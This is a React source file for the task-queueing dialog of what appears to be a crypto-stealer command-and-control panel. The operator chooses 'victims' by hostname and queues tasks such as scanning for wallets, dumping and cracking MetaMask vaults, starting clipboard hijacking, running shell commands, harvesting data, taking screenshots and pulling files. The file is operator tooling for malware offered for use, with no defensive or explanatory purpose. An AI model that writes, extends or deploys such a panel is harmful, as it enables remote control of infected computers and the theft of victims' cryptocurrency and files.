'use client';
import { useState } from 'react';
import { toast } from 'sonner';
import { Dialog, DialogContent, DialogDescription, DialogTitle } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input, Label, Select, Textarea } from '@/components/ui/input';
import { mutate } from '@/hooks/useApi';
import type { Task } from '@/lib/types';

const defaults: Record<string, Record<string, unknown>> = {
  scan_wallets: {},
  dump_vault: { target: 'metamask' },
  crack_vault: { target: 'metamask', max_seconds: 90 },
  clip_start: { replace: false },
  clip_stop: {},
  shell: { command: 'whoami' },
  harvest: {},
  screenshot: {},
  file_pull: { path: '' }
};

export function TaskDialog({
  open,
  onOpenChange,
  victimIds,
  victims
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  victimIds: string[];
  victims?: Array<{ id: string; hostname: string }>;
}) {
  const [name, setName] = useState('scan_wallets');
  const [params, setParams] = useState('{}');
  const [priority, setPriority] = useState(0);
  const [timeout, setTimeout] = useState(120);
  const [busy, setBusy] = useState(false);
  const templates = useApiTemplates();

  async function submit(event: React.FormEvent) {
    event.preventDefault();
    setBusy(true);
    try {
      const parsed = JSON.parse(params || '{}') as Record<string, unknown>;
      await mutate<{ items: Task[] }>('/tasks', 'POST', { victim_ids: victimIds, name, params: parsed, priority, timeout_sec: timeout });
      toast.success(`Queued ${name} on ${victimIds.length} victim(s)`);
      onOpenChange(false);
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'Queue failed');
    } finally {
      setBusy(false);
    }
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent>
        <DialogTitle>Queue task</DialogTitle>
        <DialogDescription>
          {victimIds.length} victim(s){victims ? `: ${victims.map((victim) => victim.hostname).slice(0, 4).join(', ')}${victims.length > 4 ? '…' : ''}` : ''}
        </DialogDescription>
        <form onSubmit={submit} className="mt-3 space-y-2.5">
          <div>
            <Label htmlFor="task-name">Task</Label>
            <Select id="task-name" value={name} onChange={(event) => { setName(event.target.value); setParams(JSON.stringify(defaults[event.target.value] ?? {})); }} className="w-full">
              {Object.keys(defaults).map((task) => <option key={task} value={task}>{task}</option>)}
            </Select>
          </div>
          <div>
            <Label htmlFor="task-params">Params (JSON)</Label>
            <Textarea id="task-params" value={params} onChange={(event) => setParams(event.target.value)} className="font-mono" />
          </div>
          <div className="grid grid-cols-2 gap-2">
            <div><Label htmlFor="priority">Priority</Label><Input id="priority" type="number" min={-10} max={10} value={priority} onChange={(event) => setPriority(Number(event.target.value))} /></div>
            <div><Label htmlFor="timeout">Timeout (s)</Label><Input id="timeout" type="number" min={1} max={3600} value={timeout} onChange={(event) => setTimeout(Number(event.target.value))} /></div>
          </div>
          <div className="flex justify-end gap-2 pt-1">
            <Button type="button" variant="ghost" onClick={() => onOpenChange(false)}>Cancel</Button>
            <Button type="submit" loading={busy} disabled={victimIds.length === 0}>Queue</Button>
          </div>
        </form>
        {templates.length > 0 ? <p className="mt-2 text-2xs text-muted">Templates: {templates.join(' · ')}</p> : null}
      </DialogContent>
    </Dialog>
  );
}

function useApiTemplates(): string[] {
  return ['scan', 'dump', 'crack', 'clip', 'shell'];
}
